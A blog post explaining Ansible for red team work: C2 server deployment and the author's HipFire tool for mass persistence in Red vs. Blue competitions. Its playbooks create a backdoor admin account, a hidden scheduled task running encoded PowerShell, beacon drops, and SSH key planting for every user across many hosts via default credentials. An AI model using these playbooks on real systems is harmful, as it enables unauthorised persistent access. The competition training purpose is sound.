---
title: Automation Domination - Using Ansible for Red Team Operations
author: taylor
pubDatetime: 2024-04-21T02:00:04Z
modDatetime:
slug: ansible-red-team
featured: false
draft: false
tags:
  - ansible
  - red team
  - automation
description: Ansible use cases for red team engagements.
---

## Table of Contents

## Introduction

Ansible is a pretty neat utility to keep in every red teamer's toolkit.

## What is Ansible?

Ansible is a tool that does a lot of cool automation stuff. It's basically a Python wrapper to
execute SSH / WinRM commands against multiple hosts, but the commands are written in YAML format to
make it super easy to read and understand what's going on.

The design philosophy of Ansible is to make the configuration as modular as possible as well as
reading the code as easy as possible, just like reading documentation.

As a red teamer, we can utilize Ansible to assist with our day-to-day operations, such as automating
C2 infrastructure deployment, but can also be used to automatically lay out persistence across
multiple teams in a Red vs. Blue (RvB) competition. We'll explore both use cases in more detail.

### How Ansible works in a nutshell

Ansible operates on control nodes and managed nodes, where the control node contains what's known as
a **playbook**, and managed nodes are the hosts where the Ansible commands are executed. From now on
I'll refer to control nodes as the _local_ machines or _local_ location, while the managed nodes
will be referred to as _remote_ machines (because the Ansible docs refer to them as such). But the
terms are interchangeable.

#### Playbooks

Playbooks are YAML files that execute **roles** on groupings of hosts. When you run a playbook, each
item in the playbook gets run in order.

```yaml
# playbook.yml
---
# Execute the "install-dependencies" role on all machines underneath the "linux" group
- hosts: linux
  roles:
    - install-dependencies
  become: yes

# Execute the "win-stuff" and "win-stuff2" roles on all machines underneath the "windows" group
- hosts: windows
  roles:
    - win-stuff
    - win-stuff2

# Execute the "do-stuff" role on all hosts regardless of group
- hosts: all
  roles:
    - do-stuff
```

#### Hosts

In a `hosts` file, you can list out the IP addresses for each group of servers you want to execute
tasks on. An example of a `hosts` file:

```ini
[linux]
192.168.1.5
192.168.1.6

[webservers]
192.168.1.7

[windows]
192.168.1.10
```

You can customize your `hosts` file to have variables, such as the following variables for WinRM
authentication:

```ini
[windows]
192.168.1.10

[windows:vars]
ansible_user=PIZZA\mario
ansible_password=Password123!
ansible_connection=winrm
ansible_winrm_port=5985
ansible_winrm_transport=ntlm
ansible_winrm_server_cert_validation=ignore
```

#### Roles

Roles are a single or grouping of multiple **tasks** that achieve some sort of purpose. You can have
a role that sets up an Apache web server, a role that installs Docker, or even one that [configures
a secure Minecraft server](https://galaxy.ansible.com/ui/standalone/roles/karafra/minecraft/).

Roles are configured in a `roles` directory, which a simple example can be found below:

```
roles/
    install-dependencies/
        tasks/
            main.yml
        files/
            some-file.txt
        vars/
            main.yml
    kali-tooling/
        tasks/
            main.yml
        vars/
            main.yml
playbook.yml
```

Each directory underneath `roles` is considered an individual role. So the above example would
contain the `install-dependencies` role and the `kali-tooling` role.

At the very least, a role must contain a `tasks` directory, which must contain a file called
`main.yml`.

#### Tasks

Tasks define the modules, or actions, performed on remote hosts. For example, here's a YAML file
that installs some dependencies, increases the `git` size, and runs `pipx ensurepath`.

```yaml
---
# This is a module that deals with apt
- name: Update apt cache
  apt:
    update_cache: yes

- name: Install dependencies
  apt:
    name:
      - git
      - python3-pip
      - pipx
      - rustc
      - python3-setuptools
      - mingw-w64
    state: present

# This is a module that runs a command
- name: Increase git size
  command: git config --global http.postBuffer 524288000

- name: Ensure pipx path
  command: pipx ensurepath
```

There's a lot more to Ansible, including dealing with variables, using custom modules/plugins, as
well as interacting with cloud stuff like AWS, but we won't cover those topics here.

## Deploying red team infrastructure

Most modern red teams will have some way to automatically deploy red team infrastructure with C2
servers, domain fronting, redirectors, phishing servers, and more from a single playbook. Ansible
can be used in conjunction with tools like Terraform and Vagrant, which all fit nicely with cloud
services like AWS, to build out those instances and configure the necessary tooling. Here's a [really
good read](https://anubissec.github.io/Using-Ansible-and-Terraform-to-Build-Red-Team-Infrastructure/#)
that just does that.

However, the scope of one of my projects was way smaller. In my [kali-on-command](https://github.com/fyrworx4/kali-on-command)
repository, I've made a collection of roles that perform basic housekeeping of a Kali
installation, such as downloading ThePorgs' Impacket, NetExec, Ghostpack binaries, as well as
Sliver.

While its main purpose was to install common tooling onto Kali jumpboxes for Red vs. Blue
competition environments, I've added roles that configures basic C2 infrastructure like Sliver.
While not the fanciest tool in the block, it gets the job done.

Here's an example of a Sliver server installation role that downloads the `sliver-server` binary,
generates a configuration file, retrieves the configuration file from the remote server, and
configures Sliver to start as a service:

```yaml
---
- name: Make new directory for sliver
  file:
    path: /opt/sliver
    state: directory

- name: Obtain Sliver release information from GitHub API
  uri:
    url: "https://api.github.com/repos/BishopFox/sliver/releases/latest"
    method: GET
    return_content: true
  register: release_info

- name: Extract Sliver server download URL
  set_fact:
    asset_url: "{{ item.browser_download_url }}"
  loop: "{{ release_info.json.assets }}"
  when: item.name == "sliver-server_linux"

- name: Download Sliver server binary
  get_url:
    url: "{{ asset_url }}"
    dest: /opt/sliver/sliver-server
    mode: a+x

- name: Generating Sliver configs
  command: "/opt/sliver/sliver-server operator --name {{ config_name }} --lhost {{ hostvars[inventory_hostname]['ansible_default_ipv4']['address'] }} --save /opt/sliver/sliver-teamserver.cfg"
  ignore_errors: true

- name: Fetch Sliver config
  fetch:
    src: /opt/sliver/sliver-teamserver.cfg
    dest: /opt/sliver/
    flat: true

- name: Create service file
  file:
    path: /etc/systemd/system/sliver.service
    state: touch

- name: Create sliver service
  blockinfile:
    path: /etc/systemd/system/sliver.service
    block: |
      [Unit]
      Description=Sliver
      After=network.target
      StartLimitIntervalSec=0

      [Service]
      Type=simple
      Restart=on-failure
      RestartSec=3
      User=root
      ExecStart=/opt/sliver/sliver-server daemon

      [Install]
      WantedBy=multi-user.target

- name: Start sliver service
  block:
    - name: Reload daemon
      command: systemctl daemon-reload

    - name: Enable service
      command: systemctl enable sliver.service

    - name: Start service
      command: systemctl start sliver.service
      register: output

    - name: Print output
      debug: msg="{{ output }}"
```

Leveraging Ansible to automate C2 deployment makes it incredibly easy to set up competition
infrastructure, especially during crunch time. However, it does take a while to create the Ansible
roles and test for bugs, so I'd recommend to ensure that a working playbook is at hand before
engaging in infrastructure setup.

It's also _really_ satisfying to see the deployment take action.

## Auto-pwnage in Red vs. Blue competitions

Ansible can also be used as an "auto-pwn" script of sorts for a Red vs. Blue competition, due to
its ability to perform configurations on multiple hosts in parallel. This makes it especially useful
during Red vs. Blue where a red teamer wants to repeat the same attack across multiple teams.

I drew lots of inspiration from [CptOfEvilMinions's GitHub repo](https://github.com/CptOfEvilMinions/BlogProjects/tree/main/red_team_series/ansible_initial_access),
as well as his [blog post](https://holdmybeersecurity.com/2019/02/26/tales-of-a-red-teamer-deploying-shenanigans-to-windows-with-ansible/),
where he talked about some of the setup he does with Ansible for his version of Red vs. Blue.

One of the ways we get initial access into machines in Red vs. Blue is through Psexec or WinRM using
default credentials (at least for Windows), and usually those default credentials land us in a
high-privileged user. Having elevated permissions on Windows grants us multiple ways to establish
persistence, as as creating a new Domain Admin or creating scheduled tasks, but also allows us to
weaken systems such as disabling Defender or UAC.

Performing those actions repeatedly across multiple teams couldn't be easier when using Ansible.

Conveniently as well, Ansible leverages WinRM to connect to Windows hosts and provides modules for
modules like creating new users or scheduled tasks. Here's an example:

```yaml
  ---
  - name: Create a new local Administrator
    win_shell: |
      net user niko Password123! /add
      net localgroup Administrators niko /add
  ignore_errors: true

  - name: Create scheduled task
    win_scheduled_task:
      name: 'Updater'
      actions:
      - path: powershell.exe
        arguments: "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHc..."
      triggers:
      - type: registration # when task is registered, run every 5 ninutes
        repetition:
          interval: PT5M
    ignore_errors: true
```

We can run basically any command we want with the `win_command` module:

```yaml
---
- name: Run whatever command
  win_command: whoami /all
```

If we wanted to transfer our beacon from local to remote, we can use the `win_copy` module:

```yaml
- name: Deliver binary
  win_copy:
    src: beacon_x64.exe
    dest: 'C:\Windows\Temp'
```

TLDR - as much as you can configure systems, you can also misconfigure them in the same way.

However, the issue with using Ansible for Red vs. Blue red team operations is that it takes way too
long to set Ansible, especially if you are newer to Ansible.

You can have a prepared listing of tasks ready to execute, as well as
malware ready to deliver to remote hosts, but setting up the `hosts` file can be cumbersome and
figuring out which Ansible flags to use can make your red teaming session be more of a
troubleshooting session.

In a situation where time is of the essence, red teamers don't have the luxury to really think about
Ansible configuration. We'd rather run stuff and pop shells right off the bat.

That leads me to my next set of Ansible tooling - HipFire.

## Introducing HipFire

[HipFire](https://github.com/fyrworx4/HipFire/tree/main) is a tool to quickly deploy binaries and
gain persistence to blue team environments through Ansible, usually using highly-privileged default
credentials.

```
usage: hipfire.py [-h] (-r RANGE | -f FILE) [-w WIN_HOSTS] [-l LIN_HOSTS] -a ACTION [--playbook PLAYBOOK] [--edit-vars EDIT_VARS] [--create-file CREATE_FILE]

options:
  -h, --help            show this help message and exit
  -r RANGE, --range RANGE
                        specify range of hosts
  -f FILE, --file FILE  specify path to hosts file
  -a ACTION, --action ACTION
                        action to take
  --playbook PLAYBOOK   path to playbook.yml file (default=playbook.yml)
  --edit-vars EDIT_VARS
                        vars to edit, e.g. lin.lin_user:root
  --create-file CREATE_FILE
                        filename to write inventory to if --create is used (default=hosts)

  -w WIN_HOSTS, --win-hosts WIN_HOSTS
                        comma-separated 4th octets of Windows hosts
  -l LIN_HOSTS, --lin-hosts LIN_HOSTS
                        comma-separated 4th octets of Linux hosts
```

The generic usage can be found on the README, but I'll speak a bit more about the thoughts behind
some of the features that the tool offers.

The main thing I wanted to achieve with this tool is the _ease-of-use_. I wanted the tool to have
as little configuration as possible in order to run, assuming that tasks are prepped beforehand to
do whatever you want on blue teamers' machines.

For starters, it incorporates one of my other tools, [subknitter](https://github.com/fyrworx4/subknitter),
to quickly generate a listing of IPs where the 3rd octet would range between two numbers and the 4th
octet would stay the same. This is useful in typical Red vs. Blue networks where you want to specify
the same machine (4th octet) but against different teams (3rd octet), and don't want to write a
temporary, janky Bash script to do so. You'd specify the broader IP range with `-r` or `--range` and
the Windows/Linux hosts by their 4th octet with the `-w`/`--win-hosts` and/or `-l`/`--lin-hosts`,
respectively.

Once the listing of IPs is generated, it writes that into a `hosts` file, along with some other
connection variables for things like SSH and WinRM that reference the `vars.yml` file. This
`vars.yml` file contains things like beacon filenames, credential information for new user
persistence, etc., and _should be one of the only files that you have to edit at all_.

You can then choose to run an Ansible playbook and execute the tasks against the hosts, or just
create the hosts file and leave it as that. To execute the playbook, you'd set the `--action` or `-a`
flag to `fire`, while creating the hosts file is just `-a create`. You can even specify a filename
for the new `hosts` file with the `--create-file` option if the create action is selected.

With `-a` set to `fire`, HipFire runs the provided Ansible playbook called `playbook.yml`, which
should be sufficient enough for most Red vs. Blue use cases (which is to run stuff on Windows then
run stuff on Linux). If you want to have more separation between tasks and hosts (e.g. running
specific set of tasks on web servers for web-related attacks) then you can modify `playbook.yml` or
make a new playbook and specify the new playbook with the `--playbook` flag.

Last but not least I've added an `--edit-vars` flag for quick modifications of Ansible variables
before playbook execution. For example, if you wanted to change the username of your persistence
user, then you can specify `--edit-vars 'win.win_user:jesse'` in-line without directly modifying the
`vars.yml` file. This will take precedence over any configurations made to `vars.yml` as well. You can look
at the `vars.yml` file to get an idea of what variables are being passed into the Python script.

The provided `playbook.yml` runs tasks within the `linux` and `windows` roles. I've included some
starter tasks that perform some simple persistence techniques, such as distributing SSH keys to all
users on a Linux system or creating a scheduled task on Windows.

I tried to write these tasks in the
spirit of Ansible by avoiding using shell commands as possible and using Ansible's built-in
functionality wherever I could. It can start to get a bit thick in the woods with loops and dealing
with special functions but in a way it's kind of elegant and also more readable than a Bash script.

```yaml
# Sample Task 2: Distribute SSH key to users
- name: Distribute SSH public key
  block:
    - name: Get SSH public key content
      ansible.builtin.set_fact:
        ssh_key_content: "{{ lookup('file', lin.sshkey_filename) }}"
      ignore_errors: true

    - name: Add SSH keys to root user
      ansible.builtin.lineinfile:
        path: /root/.ssh/authorized_keys
        line: "{{ ssh_key_content }}"
        create: true
        mode: "0600"
      ignore_errors: true

    - name: Get a list of all users
      ansible.builtin.getent:
        database: passwd
      register: users
      ignore_errors: true

    - name: Create .ssh directory for each user
      ansible.builtin.file:
        path: "/home/{{ item.key }}/.ssh"
        state: directory
        owner: "{{ item.key }}"
        mode: "0700"
      loop: "{{ lookup('dict', users.ansible_facts.getent_passwd) }}"
      when:
        - item.key != 'root'
        - item.value[1] >= '1000'
        - item.value[4] | regex_search('^/home/')
      ignore_errors: true

    - name: Create authorized_keys file for each valid user
      ansible.builtin.file:
        path: "/home/{{ item.key }}/.ssh/authorized_keys"
        state: touch
        mode: "0600"
      loop: "{{ lookup('dict', users.ansible_facts.getent_passwd) }}"
      when:
        - item.key != 'root'
        - item.value[1] >= '1000'
        - item.value[4] | regex_search('^/home/')
      ignore_errors: true

    - name: Write SSH public key into authorized_keys file for each valid user
      ansible.builtin.lineinfile:
        path: "/home/{{ item.key }}/.ssh/authorized_keys"
        line: "{{ ssh_key_content }}"
        owner: "{{ item.key }}"
        mode: "0600"
      loop: "{{ lookup('dict', users.ansible_facts.getent_passwd) }}"
      when:
        - item.key != 'root'
        - item.value[1] >= '1000'
        - item.value[4] | regex_search('^/home/')
      ignore_errors: true
```

You must add your own Ansible tasks for any other persistence mechanisms/techniques you want to
use in an Red vs. Blue engagement. The simplest way to do so is by using Ansible's `win_command` or
`command` modules (for Windows and Linux, respectively):

```yaml
# Executing a command on Windows
- name: Run a Windows command
  ansible.windows.win_command:
    cmd: whoami /all

# Executing a command on Linux
- name: Run a Linux command
  ansible.builtin.command:
    cmd: whoami
```

For any more complex commands, you may have to do some voodoo magic with different Ansible modules.

### Example usage of HipFire

Let's say we have a scenario where:

- we have 8 blue teams
- the external IP range is 1:1 NAT'd as `10.100.10X.Y` (X being team number, Y being machine number)
- we have Windows machines on .2 and .3, and Linux machines on .4 and .5

As normal, we set up our C2 infrastructure and prepare our payloads. Let's call them `apollo.exe`
and `merlin` for our Windows and Linux payloads respectively. We copy our `apollo.exe` into
`roles/windows/files` and our `merlin` into `roles/linux/files`. We also create a new SSH key called
`id_rsa` to distribute to all blue teams' Linux boxes and copy the `id_rsa.pub` into the
`roles/linux/files` directory.

Let's edit the `vars.yml` file with the username/password of the user we want to add as persistence
into the environment. We should add the filenames of our beacons, `apollo.exe` and `merlin`, and
the name of our SSH key, `id_rsa.pub`, to the file as well.

Our `vars.yml` can look like something below for now:

```yaml
lin:
  ansible_user:
  ansible_password:
  ansible_sudo_pass:
  # Linux - Tasks variables
  lin_user: freddy
  lin_pass: Sup3rS3cr3tPass!
  beacon_filename: merlin
  sshkey_filename: id_rsa.pub
  payload_dest: /opt
win:
  ansible_user:
  ansible_password:
  # Windows- Tasks variables
  win_user: freddy
  win_pass: Sup3rS3cr3tPass!
  beacon_filename: apollo.exe
  payload_dest: C:\Windows\Temp
```

Now we must obtain some sort of administrative default credential into the environment - that can
be from OSINT on the blue team briefing packet, or discovered quickly on the environment
(assuming that the environment is created accordingly, hopefully). Once we obtain those creds,
we can plug them into our `vars.yml` file as well.

Let's say that the default administrative creds were something like `root:NiceToMeetYou!` for Linux
and `Administrator:NiceToMeetYou!` for Windows. Let's add those to our `vars.yml` file:

```yaml
lin:
  ansible_user: root
  ansible_password: NiceToMeetYou!
  ansible_sudo_pass: NiceToMeetYou!
  # Linux - Tasks variables
  lin_user: freddy
  lin_pass: Sup3rS3cr3tPass!
  beacon_filename: merlin
  sshkey_filename: id_rsa.pub
  payload_dest: /opt
win:
  ansible_user: Administrator
  ansible_password: NiceToMeetYou!
  # Windows - Tasks variables
  win_user: freddy
  win_pass: Sup3rS3cr3tPass!
  beacon_filename: apollo.exe
  payload_dest: C:\Windows\Temp
```

Nice! We're almost done. All that's left is to run HipFire with the following flags:

```bash
python3 hipfire.py -r 10.100.101-108 -w 2,3 -l 4,5 -a fire
```

Where:

- `-r`: external subnet range with range in team octet (the 3rd octet)
- `-w`: the last octets for the Windows hosts
- `-l`: the last octets for the Linux hosts
- `-a`: the action to take

Then HipFire should be firing!

Note that sometimes the connection times out for no reason or blue teamers firewall off WinRM super
quickly, so it might not be 100% consistent in practice. However it should still be a super nice
utility for red teamers to focus more on more complex exploits or creating some sort of impact
(e.g. turning off services).

## References

- [https://holdmybeersecurity.com/2018/06/06/part-4-how-to-red-team-obtaining-initial-access/](https://holdmybeersecurity.com/2018/06/06/part-4-how-to-red-team-obtaining-initial-access/)
- [https://holdmybeersecurity.com/2019/02/26/tales-of-a-red-teamer-deploying-shenanigans-to-windows-with-ansible/](https://holdmybeersecurity.com/2019/02/26/tales-of-a-red-teamer-deploying-shenanigans-to-windows-with-ansible/)
- [https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_reuse_roles.html](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_reuse_roles.html)
- [https://github.com/CptOfEvilMinions/BlogProjects/tree/main/red_team_series/ansible_initial_access](https://github.com/CptOfEvilMinions/BlogProjects/tree/main/red_team_series/ansible_initial_access)
